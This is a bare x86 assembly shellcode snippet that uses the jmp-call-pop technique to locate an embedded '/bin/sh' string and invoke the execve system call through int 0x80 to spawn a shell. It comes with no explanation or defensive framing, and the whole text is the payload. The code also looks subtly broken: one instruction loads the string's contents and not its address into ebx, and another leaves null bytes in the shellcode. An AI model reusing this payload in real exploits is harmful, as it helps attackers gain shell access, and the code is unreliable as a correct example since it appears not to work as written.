jmp short take_bin_sh

shellcode:
  pop esi
  mov eax, 0
  mov byte [esi + 7], al
  mov ebx, [esi]
  mov ecx, eax
  mov edx, eax
  mov eax, 0xb
  int 0x80

take_bin_sh:
  call shellcode
  db "/bin/sh"
